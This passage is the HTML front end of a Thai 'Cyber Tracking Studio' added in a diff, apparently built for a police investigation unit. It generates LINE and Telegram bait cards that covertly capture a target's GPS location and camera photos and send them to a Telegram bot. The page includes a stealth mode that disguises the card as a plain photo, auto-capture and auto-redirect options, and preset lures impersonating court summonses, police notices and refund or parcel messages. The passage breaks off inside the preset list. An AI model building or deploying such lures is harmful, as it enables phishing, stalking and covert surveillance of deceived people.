@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html lang="th">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Cyber Tracking Studio - ระบบสนับสนุนงานสืบสวน (San BOT)</title>
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'police-blue': '#1e3a8a',
+                        'police-gold': '#d97706',
+                    },
+                    fontFamily: {
+                        sans: ['Prompt', 'Sarabun', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Prompt:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300&family=Sarabun:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <!-- FontAwesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <!-- Main Police System Design CSS -->
+    <link rel="stylesheet" href="css/index.css">
+</head>
+
+<body class="animated-bg min-h-screen text-slate-800 antialiased py-3 sm:py-6 px-3 sm:px-6">
+
+
+    <div class="max-w-7xl mx-auto w-full">
+        <div class="glass rounded-3xl shadow-2xl p-4 sm:p-8 card-hover border border-white space-y-6">
+
+            <!-- ==================== POLICE SYSTEM HEADER ==================== -->
+            <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 pb-6 border-b-2 border-blue-100">
+                <div class="flex items-center space-x-3 sm:space-x-4">
+                    <button type="button" id="tracking-back-btn" onclick="smartTrackingBack()" 
+                        class="w-11 h-11 bg-white hover:bg-blue-50 text-police-blue rounded-2xl flex items-center justify-center transition border-2 border-blue-200 shadow-sm flex-shrink-0 active:scale-95" 
+                        title="กลับหน้าหลัก">
+                        <i class="fa-solid fa-arrow-left text-base"></i>
+                    </button>
+                    <div class="w-14 h-14 sm:w-16 sm:h-16 bg-gradient-to-br from-blue-700 via-indigo-700 to-blue-900 rounded-2xl flex items-center justify-center shadow-xl floating flex-shrink-0 text-white">
+                        <span class="text-3xl sm:text-4xl">⚡</span>
+                    </div>
+                    <div>
+                        <div class="flex items-center gap-2 mb-0.5">
+                            <h2 class="text-xl sm:text-2xl md:text-3xl font-black text-police-blue">ศูนย์สร้างการ์ด Flex & ล่อลวงเป้าหมาย</h2>
+                            <span class="hidden md:inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-blue-50 text-police-blue text-[11px] font-bold border border-blue-200 shadow-sm">
+                                <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                                TRACKING STUDIO
+                            </span>
+                        </div>
+                        <p class="text-gray-600 font-medium text-xs sm:text-sm">สร้างการ์ด Social Engineering Bait ดักพิกัดดาวเทียมและบันทึกภาพถ่ายกล้องหน้า ส่งตรงเข้า Telegram Bot</p>
+                    </div>
+                </div>
+
+                <!-- Top Actions (Telegram & Help) -->
+                <div class="flex items-center gap-2 self-end sm:self-auto flex-shrink-0">
+                    <button type="button" onclick="configureTelegramBot(false)" 
+                        class="px-3.5 py-2.5 bg-sky-50 hover:bg-sky-100 text-sky-700 rounded-xl text-xs font-bold transition border border-sky-200 shadow-sm flex items-center gap-1.5 active:scale-95" title="ตั้งค่า Telegram Bot สำหรับรับพิกัด/ภาพถ่าย">
+                        <i class="fa-brands fa-telegram text-base text-sky-500"></i>
+                        <span>ตั้งค่า Telegram</span>
+                    </button>
+                    <button type="button" onclick="showHelpModal()" 
+                        class="w-10 h-10 bg-amber-50 hover:bg-amber-100 text-amber-700 rounded-xl flex items-center justify-center transition border border-amber-200 shadow-sm active:scale-95" 
+                        title="คู่มือการใช้งาน">
+                        <span class="text-lg">💡</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Target Dossier Banner -->
+            <div id="target-dossier-bar" class="rounded-2xl border border-blue-200 p-3.5 sm:p-4 bg-gradient-to-r from-blue-50/90 via-indigo-50/70 to-blue-50/90 flex flex-wrap items-center justify-between gap-3 shadow-sm">
+                <div class="flex items-center gap-3 min-w-0">
+                    <div class="w-10 h-10 rounded-xl bg-police-blue text-white flex items-center justify-center shadow-md flex-shrink-0">
+                        <span class="text-xl">🎯</span>
+                    </div>
+                    <div class="truncate">
+                        <span class="text-[11px] text-blue-700 font-extrabold uppercase tracking-wider block">ACTIVE TARGET INTEL • ข้อมูลเป้าหมายคดี</span>
+                        <span id="dossier-target-display" class="font-black text-slate-800 text-sm sm:text-base truncate">เป้าหมาย: ทั่วไป (ไม่ได้ระบุชื่อเฉพาะ)</span>
+                    </div>
+                </div>
+                <div class="flex items-center gap-2 ml-auto">
+                    <span id="dossier-badge" class="px-3 py-1 rounded-full bg-emerald-100 text-emerald-800 font-bold text-xs border border-emerald-300 shadow-sm flex items-center gap-1">
+                        <span class="w-2 h-2 rounded-full bg-emerald-500"></span>
+                        พร้อมสร้างลิงก์
+                    </span>
+                    <button type="button" onclick="focusTargetInput()" class="px-3 py-1.5 rounded-xl bg-white hover:bg-blue-50 text-blue-700 text-xs font-bold border border-blue-200 shadow-sm transition active:scale-95">
+                        ✏️ แก้ไข
+                    </button>
+                </div>
+            </div>
+
+            <!-- ==================== MAIN 2-COLUMN LAYOUT ==================== -->
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
+                
+                <!-- LEFT COLUMN: Form Controls (7 cols on lg) -->
+                <div class="lg:col-span-7 space-y-5">
+                    
+                    <!-- Quick Preset Templates Card -->
+                    <div class="rounded-2xl border border-blue-100 bg-white/90 p-4 sm:p-5 shadow-sm space-y-3.5">
+                        <div class="flex items-center justify-between pb-2 border-b border-blue-100">
+                            <span class="text-sm font-black text-police-blue flex items-center gap-2">
+                                <span class="text-base text-police-gold">⚡</span> กลยุทธ์เหยื่อล่อตามรูปคดี (Operational Decoy Scenarios)
+                            </span>
+                            <button type="button" id="btn-fill-report"
+                                class="text-xs font-bold text-amber-800 bg-amber-50 hover:bg-amber-100 border border-amber-300 px-3 py-1.5 rounded-xl transition-all flex items-center gap-1 shadow-sm active:scale-95">
+                                <span>📍</span> ดึงจากที่เกิดเหตุ
+                            </button>
+                        </div>
+
+                        <!-- Category Tabs for Presets -->
+                        <div class="flex items-center gap-1.5 p-1 bg-slate-100 rounded-xl border border-slate-200 text-xs font-bold overflow-x-auto">
+                            <button type="button" onclick="filterPresetCategory('legal')" id="pcat-legal" class="px-3 py-1.5 rounded-lg bg-police-blue text-white shrink-0 transition font-bold shadow-sm">⚖️ คดี & กฎหมาย</button>
+                            <button type="button" onclick="filterPresetCategory('traffic')" id="pcat-traffic" class="px-3 py-1.5 rounded-lg text-slate-600 hover:text-slate-900 hover:bg-slate-200/60 shrink-0 transition font-bold">🚦 จราจร & ขนส่ง</button>
+                            <button type="button" onclick="filterPresetCategory('finance')" id="pcat-finance" class="px-3 py-1.5 rounded-lg text-slate-600 hover:text-slate-900 hover:bg-slate-200/60 shrink-0 transition font-bold">💰 การเงิน & ภาษี</button>
+                            <button type="button" onclick="filterPresetCategory('photo')" id="pcat-photo" class="px-3 py-1.5 rounded-lg text-slate-600 hover:text-slate-900 hover:bg-slate-200/60 shrink-0 transition font-bold">🖼️ ภาพล้วน (Stealth)</button>
+                        </div>
+
+                        <!-- Preset Items Container -->
+                        <div id="presets-container" class="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
+                            <!-- Items populated via JS -->
+                        </div>
+                    </div>
+
+                    <!-- Main Form Card -->
+                    <main class="rounded-2xl border border-blue-100 bg-white p-5 sm:p-7 shadow-sm space-y-5">
+                        
+                        <!-- Mode Switch: Image Only Toggle -->
+                        <div class="flex items-center justify-between p-3.5 rounded-2xl bg-blue-50/70 border border-blue-200">
+                            <div class="flex items-center gap-3">
+                                <span class="text-2xl">🖼️</span>
+                                <div>
+                                    <p class="text-sm font-black text-police-blue flex items-center gap-2">
+                                        <span>โหมดส่งเฉพาะรูปภาพล้วน (Stealth Photo Mode)</span>
+                                        <span class="text-[10px] bg-blue-100 text-police-blue px-2 py-0.5 rounded-full border border-blue-200 font-bold">แนบเนียนสูงสุด</span>
+                                    </p>
+                                    <p class="text-xs text-slate-500 font-medium">ซ่อนหัวข้อและปุ่มกด ส่งเสมือนภาพถ่ายธรรมดาในแชท เมื่อเป้าหมายแตะดูรูปจะดักพิกัดและกล้องหน้าทันที</p>
+                                </div>
+                            </div>
+                            <label class="relative inline-flex items-center cursor-pointer">
+                                <input type="checkbox" id="toggle-image-only" class="sr-only peer" onchange="toggleImageOnlyMode(this.checked)">
+                                <div class="w-11 h-6 bg-slate-300 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-police-blue"></div>
+                            </label>
+                        </div>
+
+                        <!-- Step 1: Target Intel & Phone -->
+                        <section class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label for="target-name" class="block text-sm font-bold text-police-blue mb-2 flex items-center gap-2">
+                                    <span class="w-5 h-5 rounded-md bg-police-blue text-white text-xs flex items-center justify-center font-bold">1</span>
+                                    ชื่อเป้าหมาย / เคสสืบสวน
+                                </label>
+                                <div class="relative">
+                                    <span class="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 text-sm">🎯</span>
+                                    <input type="text" id="target-name" placeholder="เช่น นายสมเกียรติ หรือ ผู้ต้องสงสัย-A"
+                                        value="เป้าหมายการสืบสวน"
+                                        class="w-full pl-10 pr-4 py-3 border-2 border-blue-200 rounded-xl focus:ring-4 focus:ring-police-blue/20 focus:border-police-blue font-medium bg-white text-slate-800 shadow-sm transition"
+                                        oninput="syncTargetUrl(); updateDossierDisplay();">
+                                </div>
+                            </div>
+                            <div>
+                                <label for="target-phone" class="block text-sm font-bold text-police-blue mb-2 flex items-center gap-2">
+                                    <span class="w-5 h-5 rounded-md bg-police-blue text-white text-xs flex items-center justify-center font-bold">📞</span>
+                                    เบอร์โทรเป้าหมาย (Optional)
+                                </label>
+                                <div class="relative">
+                                    <span class="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 text-sm">📱</span>
+                                    <input type="tel" id="target-phone" placeholder="08x-xxx-xxxx"
+                                        class="w-full pl-10 pr-4 py-3 border-2 border-blue-200 rounded-xl focus:ring-4 focus:ring-police-blue/20 focus:border-police-blue font-medium bg-white text-slate-800 shadow-sm transition"
+                                        oninput="updateDossierDisplay();">
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Step 2: Image URL -->
+                        <section>
+                            <div class="flex items-center justify-between mb-2">
+                                <label for="image-url" class="block text-sm font-bold text-police-blue flex items-center gap-2">
+                                    <span class="w-5 h-5 rounded-md bg-police-blue text-white text-xs flex items-center justify-center font-bold">2</span>
+                                    ลิงก์รูปภาพหน้าปก (HTTPS Image URL)
+                                </label>
+                                <button type="button" onclick="chooseQuickImagePreset()" class="text-xs text-blue-700 hover:text-blue-900 font-bold flex items-center gap-1 active:scale-95">
+                                    <span>🖼️</span> เลือกภาพตัวอย่าง
+                                </button>
+                            </div>
+                            <div class="relative">
+                                <span class="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 text-sm">🌐</span>
+                                <input type="url" id="image-url" placeholder="https://images.unsplash.com/photo-..."
+                                    class="w-full pl-10 pr-4 py-3 border-2 border-blue-200 rounded-xl focus:ring-4 focus:ring-police-blue/20 focus:border-police-blue font-medium bg-white text-slate-800 shadow-sm transition">
+                            </div>
+                        </section>
+
+                        <!-- Step 3: Title (Collapsible in Image Only mode) -->
+                        <section id="section-title">
+                            <label for="flex-title" class="block text-sm font-bold text-police-blue mb-2 flex items-center gap-2">
+                                <span class="w-5 h-5 rounded-md bg-police-blue text-white text-xs flex items-center justify-center font-bold">3</span>
+                                หัวข้อการ์ด (Decoy Title)
+                            </label>
+                            <input type="text" id="flex-title" placeholder="📌 ระบุหัวข้อ เช่น หมายเรียกพยานคดีความ หรือ พัสดุตกค้าง"
+                                class="w-full px-4 py-3 border-2 border-blue-200 rounded-xl focus:ring-4 focus:ring-police-blue/20 focus:border-police-blue font-medium bg-white text-slate-800 shadow-sm transition">
+                        </section>
+
+                        <!-- Step 4: Detail (Collapsible in Image Only mode) -->
+                        <section id="section-detail">
+                            <label for="flex-detail" class="block text-sm font-bold text-police-blue mb-2 flex items-center gap-2">
+                                <span class="w-5 h-5 rounded-md bg-police-blue text-white text-xs flex items-center justify-center font-bold">4</span>
+                                รายละเอียดข้อความ (Decoy Detail)
+                            </label>
+                            <textarea id="flex-detail" rows="2"
+                                placeholder="กรุณากดที่รูปภาพด้านบน หรือปุ่มด้านล่างเพื่อตรวจสอบรายละเอียด..."
+                                class="w-full px-4 py-3 border-2 border-blue-200 rounded-xl focus:ring-4 focus:ring-police-blue/20 focus:border-police-blue font-medium bg-white text-slate-800 shadow-sm transition resize-none"></textarea>
+                        </section>
+
+                        <!-- Step 5: Decoy Destination URL & Tracking Builder -->
+                        <section class="space-y-3 pt-2 border-t border-slate-100">
+                            <div class="flex items-center justify-between">
+                                <label for="destination-url" class="text-sm font-bold text-police-blue flex items-center gap-2">
+                                    <span class="w-5 h-5 rounded-md bg-police-blue text-white text-xs flex items-center justify-center font-bold">5</span>
+                                    เว็บปลายทางจริงที่เหยื่อจะเปิด (Forward URL)
+                                </label>
+                                <span class="text-xs text-emerald-800 bg-emerald-50 px-2.5 py-0.5 rounded-full font-bold border border-emerald-200 flex items-center gap-1 shadow-sm">
+                                    <span>⚡</span> ดักจับ & Forward เนียนตา
+                                </span>
+                            </div>
+
+                            <!-- Tracking Engine Switch -->
+                            <div class="grid grid-cols-2 gap-2 p-1.5 bg-slate-100 rounded-xl border border-slate-200 text-xs">
+                                <label class="flex items-center justify-center gap-1.5 p-2 rounded-lg cursor-pointer transition font-bold text-slate-700 hover:bg-slate-200 has-[:checked]:bg-police-blue has-[:checked]:text-white has-[:checked]:shadow-sm">
+                                    <input type="radio" name="tracking-engine" value="github" checked class="sr-only" onchange="syncTargetUrl()">
+                                    <span>🌐 ลิงก์ตรงเว็บ/GitHub (สากล & เสถียร)</span>
+                                </label>
+                                <label class="flex items-center justify-center gap-1.5 p-2 rounded-lg cursor-pointer transition font-bold text-slate-700 hover:bg-slate-200 has-[:checked]:bg-police-blue has-[:checked]:text-white has-[:checked]:shadow-sm">
+                                    <input type="radio" name="tracking-engine" value="liff" class="sr-only" onchange="syncTargetUrl()">
+                                    <span>📱 ลิงก์ LINE LIFF</span>
+                                </label>
+                            </div>
+
+                            <!-- Destination URL Input -->
+                            <div class="space-y-2">
+                                <div class="relative">
+                                    <span class="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 text-sm">🌐</span>
+                                    <input type="url" id="destination-url" placeholder="https://track.thailandpost.co.th/ หรือ https://ptm.police.go.th/"
+                                        class="w-full pl-10 pr-4 py-3 border-2 border-blue-200 rounded-xl focus:ring-4 focus:ring-police-blue/20 focus:border-police-blue font-medium bg-white text-slate-800 shadow-sm transition"
+                                        oninput="syncTargetUrl()">
+                                </div>
+
+                                <!-- Options -->
+                                <div class="flex flex-wrap items-center gap-4 px-1 text-xs text-slate-700 pt-1 font-medium">
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" id="check-autorun" checked onchange="syncTargetUrl()" class="rounded text-police-blue focus:ring-police-blue w-4 h-4">
+                                        <span>ดักจับอัตโนมัติ (autorun=1)</span>
+                                    </label>
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" id="check-dualcam" onchange="syncTargetUrl()" class="rounded text-police-blue focus:ring-police-blue w-4 h-4">
+                                        <span>ถ่ายกล้องหน้า + กล้องหลัง (cam=dual)</span>
+                                    </label>
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" id="check-redirect" checked onchange="syncTargetUrl()" class="rounded text-police-blue focus:ring-police-blue w-4 h-4">
+                                        <span>Forward อัตโนมัติ</span>
+                                    </label>
+                                </div>
+                                
+                                <input type="hidden" id="target-url">
+
+                                <!-- Visual Preview of Resulting Tracking URL -->
+                                <div class="p-3 rounded-xl bg-slate-50 text-slate-800 text-xs font-mono border border-slate-200 flex items-center justify-between gap-2 overflow-hidden shadow-inner">
+                                    <div class="truncate flex items-center gap-2 flex-1">
+                                        <span class="text-amber-700 font-bold shrink-0">ลิงก์ส่งจริง:</span>
+                                        <span id="full-url-preview" class="text-emerald-700 font-bold truncate">กำลังสร้าง...</span>
+                                    </div>
+                                    <div class="flex items-center gap-1.5 shrink-0 font-sans">
+                                        <button type="button" onclick="copyFullTrackingUrl()" title="คัดลอกลิงก์ส่งจริง" class="px-2.5 py-1.5 rounded-lg bg-white hover:bg-slate-100 text-slate-700 hover:text-police-blue transition flex items-center gap-1 text-xs font-bold border border-slate-200 shadow-sm active:scale-95">
+                                            <i class="fa-regular fa-copy"></i> คัดลอก
+                                        </button>
+                                        <button type="button" onclick="showQrModal()" title="แสดง QR Code สำหรับสแกน" class="px-2.5 py-1.5 rounded-lg bg-white hover:bg-slate-100 text-slate-700 hover:text-police-blue transition flex items-center gap-1 text-xs font-bold border border-slate-200 shadow-sm active:scale-95">
+                                            <i class="fa-solid fa-qrcode"></i> QR
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Button Text Customizer -->
+                            <div id="section-btn-text" class="pt-1">
+                                <label for="flex-btn-text" class="block text-xs font-bold text-slate-700 mb-1 flex items-center gap-1">
+                                    <span>🔗</span> ข้อความบนปุ่มกด (แนบเนียน/สุภาพ):
+                                </label>
+                                <div class="flex gap-2">
+                                    <input type="text" id="flex-btn-text" placeholder="อ่านเพิ่มเติม" value="อ่านเพิ่มเติม"
+                                        class="flex-1 px-4 py-2.5 border-2 border-blue-200 rounded-xl text-xs font-medium bg-white text-slate-800 focus:ring-4 focus:ring-police-blue/20 focus:border-police-blue">
+                                    <select onchange="document.getElementById('flex-btn-text').value = this.value; updateLivePreviewText();"
+                                        class="bg-white border border-slate-300 text-slate-800 rounded-xl px-3 text-xs font-bold cursor-pointer shadow-sm">
+                                        <option value="อ่านเพิ่มเติม">อ่านเพิ่มเติม</option>
+                                        <option value="ดูรายละเอียดเพิ่มเติม">ดูรายละเอียดเพิ่มเติม</option>
+                                        <option value="ตรวจสอบเอกสาร">ตรวจสอบเอกสาร</option>
+                                        <option value="ตรวจสอบสถานะคดี">ตรวจสอบสถานะคดี</option>
+                                        <option value="ตรวจสอบพัสดุ">ตรวจสอบพัสดุ</option>
+                                        <option value="ชำระเงินออนไลน์">ชำระเงินออนไลน์</option>
+                                        <option value="ยืนยันรับเงินคืน">ยืนยันรับเงินคืน</option>
+                                        <option value="กดรับสิทธิ์รางวัล">กดรับสิทธิ์รางวัล</option>
+                                    </select>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Multi-Platform Action Buttons -->
+                        <section class="pt-4 space-y-3 border-t-2 border-blue-100">
+                            <p class="text-xs font-black text-police-blue uppercase tracking-wider flex items-center gap-2">
+                                <span class="text-sm">🚀</span> ศูนย์กระจายข้อความ & สั่งการ (Dispatch Actions)
+                            </p>
+
+                            <!-- LINE Channel Actions -->
+                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                                <button id="btn-sendflex"
+                                    class="py-3.5 px-4 bg-gradient-to-r from-blue-700 via-blue-800 to-indigo-800 hover:from-blue-800 hover:to-indigo-900 text-white font-black rounded-xl shadow-lg transition-all duration-200 active:scale-95 flex justify-center items-center gap-2 text-sm border border-blue-400/30">
+                                    <span>💬</span> <span>ส่งเข้าแชท LINE (Talk)</span>
+                                </button>
+
+                                <button id="btn-shareflex"
+                                    class="py-3.5 px-4 bg-gradient-to-r from-emerald-600 to-teal-700 hover:from-emerald-700 hover:to-teal-800 text-white font-black rounded-xl shadow-lg transition-all duration-200 active:scale-95 flex justify-center items-center gap-2 text-sm border border-emerald-400/30">
+                                    <span>🚀</span> <span>แชร์การ์ด LINE (Share)</span>
+                                </button>
+                            </div>
+
+                            <!-- Telegram Channel Action -->
+                            <div class="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
+                                <button type="button" id="btn-sendtelegram"
+                                    class="sm:col-span-2 py-3.5 px-4 bg-gradient-to-r from-sky-600 to-blue-600 hover:from-sky-700 hover:to-blue-700 text-white font-black rounded-xl shadow-lg transition-all duration-200 active:scale-95 flex justify-center items-center gap-2 text-sm border border-sky-400/30">
+                                    <i class="fa-brands fa-telegram text-lg"></i> <span>ส่งเข้า Telegram Bot ทันที</span>
+                                </button>
+                                <button type="button" id="btn-telegram-config"
+                                    class="py-3 px-3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold rounded-xl border border-slate-300 transition-all text-xs flex items-center justify-center gap-1.5 shadow-sm active:scale-95">
+                                    <i class="fa-solid fa-gear text-slate-500"></i> <span>ตั้งค่าบ็อต</span>
+                                </button>
+                            </div>
+
+                            <!-- Utility Buttons -->
+                            <div class="grid grid-cols-3 gap-2.5 pt-1">
+                                <button type="button" id="btn-testlink"
+                                    class="py-2.5 px-2 bg-blue-50 hover:bg-blue-100 text-police-blue font-bold rounded-xl border border-blue-200 transition-all text-xs flex items-center justify-center gap-1.5 active:scale-95 shadow-sm">
+                                    <i class="fa-solid fa-arrow-up-right-from-square"></i> <span>ทดสอบเปิด</span>
+                                </button>
+                                <button type="button" id="btn-copyflex"
+                                    class="py-2.5 px-2 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold rounded-xl border border-slate-300 transition-all text-xs flex items-center justify-center gap-1.5 active:scale-95 shadow-sm">
+                                    <span>📋</span> <span>Copy JSON</span>
+                                </button>
+                                <button type="button" id="btn-resetflex"
+                                    class="py-2.5 px-2 bg-rose-50 hover:bg-rose-100 text-rose-600 font-bold rounded-xl border border-rose-200 transition-all text-xs flex items-center justify-center gap-1.5 active:scale-95 shadow-sm">
+                                    <span>🔄</span> <span>ล้างค่า</span>
+                                </button>
+                            </div>
+                        </section>
+                    </main>
+                </div>
+
+                <!-- RIGHT COLUMN: Dual Live Interactive Preview (5 cols on lg) -->
+                <div class="lg:col-span-5 space-y-4">
+                    <div class="rounded-2xl border border-blue-100 bg-white p-4 sm:p-5 shadow-sm space-y-4">
+                        <div class="flex items-center justify-between pb-3 border-b border-slate-200">
+                            <!-- Preview Tabs (LINE vs Telegram) -->
+                            <div class="flex items-center gap-1.5 p-1 bg-slate-100 rounded-xl border border-slate-200">
+                                <button type="button" id="tab-btn-line" onclick="switchPreviewTab('line')"
+                                    class="px-3 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1.5 bg-police-blue text-white shadow-sm">
+                                    <span>📱</span> <span>LINE Flex</span>
+                                </button>
+                                <button type="button" id="tab-btn-tele" onclick="switchPreviewTab('telegram')"
+                                    class="px-3 py-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1.5 text-slate-600 hover:text-slate-900">
+                                    <i class="fa-brands fa-telegram text-sky-500"></i> <span>Telegram</span>
+                                </button>
+                            </div>
+
+                            <span id="preview-badge-mode" class="px-3 py-1 rounded-full bg-blue-50 text-police-blue text-xs font-bold border border-blue-200 shadow-sm">
+                                Full Card
+                            </span>
+                        </div>
+
+                        <!-- TAB 1: LINE Chat Simulation Box -->
+                        <div id="view-line-preview" class="bg-slate-100 p-3 sm:p-4 rounded-2xl border border-slate-200">
+                            <div class="line-bubble-mock max-w-sm mx-auto transition-all duration-300">
+                                <!-- Hero Image -->
+                                <div id="preview-container" class="w-full h-52 bg-slate-100 relative overflow-hidden flex items-center justify-center border-b border-slate-200">
+                                    <div id="preview-placeholder" class="text-center p-4 text-slate-400 space-y-1">
+                                        <span class="block text-3xl">🖼️</span>
+                                        <span class="block text-xs font-semibold">ตัวอย่างรูปภาพ</span>
+                                    </div>
+                                    <img id="image-preview" class="w-full h-full object-cover hidden" alt="Live Preview">
+                                </div>
+
+                                <!-- Body Text (Hide in Image Only mode) -->
+                                <div id="preview-body-container" class="p-4 space-y-1.5">
+                                    <h3 id="preview-title" class="font-black text-police-blue text-sm leading-snug line-clamp-2">
+                                        📌 ระบบสนับสนุนงานตำรวจ (San BOT)
+                                    </h3>
+                                    <p id="preview-detail" class="text-xs text-slate-600 leading-relaxed line-clamp-3">
+                                        กดที่รูปภาพด้านบน หรือข้อความด้านล่างเพื่อตรวจสอบรายละเอียด
+                                    </p>
+                                </div>
+
+                                <!-- Footer Link Text -->
+                                <div id="preview-footer-container" class="px-4 py-2.5 border-t border-slate-100 flex items-center justify-between hover:bg-slate-50 cursor-pointer transition">
+                                    <span id="preview-btn-text" class="text-xs font-semibold text-slate-500">อ่านเพิ่มเติม</span>
+                                    <span class="text-slate-400 text-xs font-bold">›</span>
+                                </div>
+                            </div>
+                            <p class="text-[11px] text-slate-500 text-center mt-3 font-medium">
+                                จำลองการแสดงผลบน LINE Flex Message (Mega Bubble)
+                            </p>
+                        </div>
+
+                        <!-- TAB 2: Telegram Chat Simulation Box -->
+                        <div id="view-tele-preview" class="hidden">
+                            <div class="telegram-chat-viewport">
+                                <div class="telegram-bubble">
+                                    <!-- Hero Image -->
+                                    <img id="mock-tele-hero-img" class="telegram-hero-img" src="https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=800&q=80" alt="Telegram Preview">
+
+                                    <!-- Telegram Body -->
+                                    <div class="telegram-body">
+                                        <!-- Sender Header -->
+                                        <div class="flex items-center gap-2 mb-2 pb-1.5 border-b border-slate-700/60">
+                                            <div class="w-6 h-6 rounded-full bg-gradient-to-tr from-sky-600 to-cyan-400 flex items-center justify-center text-[10px] text-white font-bold">
+                                                <i class="fa-solid fa-robot"></i>
+                                            </div>
+                                            <div class="flex-1">
+                                                <div class="text-xs font-bold text-sky-400 flex items-center gap-1">
+                                                    <span>San BOT</span>
+                                                    <i class="fa-solid fa-circle-check text-[10px] text-sky-400"></i>
+                                                </div>
+                                            </div>
+                                            <span class="text-[10px] text-slate-400 font-mono" id="mock-tele-timestamp">11:00 น.</span>
+                                        </div>
+
+                                        <!-- Content (Hidden in Image Only mode) -->
+                                        <div id="tele-body-content" class="space-y-1.5 mb-2">
+                                            <h4 id="mock-tele-title" class="text-xs font-bold text-white leading-snug">
+                                                📦 แจ้งเตือน: พัสดุของคุณยังจัดส่งไม่สำเร็จ
+                                            </h4>
+                                            <p id="mock-tele-detail" class="text-[11px] text-slate-300 leading-relaxed">
+                                                หมายเลขพัสดุ TH9028481 ติดต่อผู้รับไม่ได้ กรุณากดยืนยันตำแหน่งจัดส่ง
+                                            </p>
+                                        </div>
+
+                                        <!-- Tracking URL Tag -->
+                                        <div id="mock-tele-url-tag" class="p-1.5 rounded bg-emerald-950/60 border-l-2 border-emerald-500 font-mono text-[10px] text-emerald-300 truncate">
+                                            https://.../link.html?url=...
+                                        </div>
+
+                                        <!-- Inline Keyboard Button -->
+                                        <div class="telegram-inline-btn" id="mock-tele-btn-container">
+                                            <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i>
+                                            <span id="mock-tele-btn-text">อ่านเพิ่มเติม</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <p class="text-[11px] text-slate-500 text-center mt-3 font-medium">
+                                จำลองจากข้อความ Telegram Bot Photo + Inline Keyboard Button
+                            </p>
+                        </div>
+
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- ==================== FOOTER ==================== -->
+            <div class="text-center pt-3 border-t border-blue-100">
+                <p class="text-xs text-slate-500 font-medium">San BOT Cyber Intelligence & Tracking Studio • ฝ่ายสืบสวน สภ.นิคมพัฒนา ภ.จว.ระยอง</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Live Preview & Tactical Engine Logic -->
+    <script>
+        // Preset Database categorized by police operational scenarios
+        const PRESET_DB = {
+            legal: [
+                {
+                    id: 'court_doc',
+                    icon: '📄',
+                    name: 'หมายเรียกพยานคดีความ',
+                    img: 'https://images.unsplash.com/photo-1568667256549-094345857637?w=800&q=80',
+                    title: '📄 หมายเรียกพยานคดีความ (ศาลอาญา)',
+                    detail: 'เอกสารสำคัญทางคดี กรุณาเปิดตรวจสอบรายละเอียดและกำหนดการนัดหมายทางออนไลน์',
+                    dest: 'https://www.coj.go.th/',
+                    btn: 'ตรวจสอบเอกสาร',
+                    targetTag: 'เคสหมายเรียกคดี'
+                },
+                {
+                    id: 'case_status',
+                    icon: '⚖️',
+                    name: 'ตรวจสอบสำนวนคดีออนไลน์',
+                    img: 'https://images.unsplash.com/photo-1589829545856-d10d557cf95f?w=800&q=80',
+                    title: '⚖️ ระบบตรวจสอบสถานะสำนวนคดีความ (สตช.)',
+                    detail: 'คดีอาญาของท่านมีความคืบหน้า กรุณาตรวจสอบบันทึกข้อกล่าวหาและหลักฐานผ่านระบบออนไลน์',
+                    dest: 'https://www.royalthaipolice.go.th/',
+                    btn: 'ตรวจสอบสถานะคดี',
+                    targetTag: 'เคสตรวจสอบคดี'
+                },
+                {
+                    id: 'police_notice',
+                    icon: '🚨',
+                    name: 'หนังสือแจ้งเตือนคดีความ',
+                    img: 'https://images.unsplash.com/photo-1585829365295-ab7cd400c167?w=800&q=80',
+                    title: '🚨 หนังสือแจ้งเตือนการกระทำความผิดทางคอมพิวเตอร์',
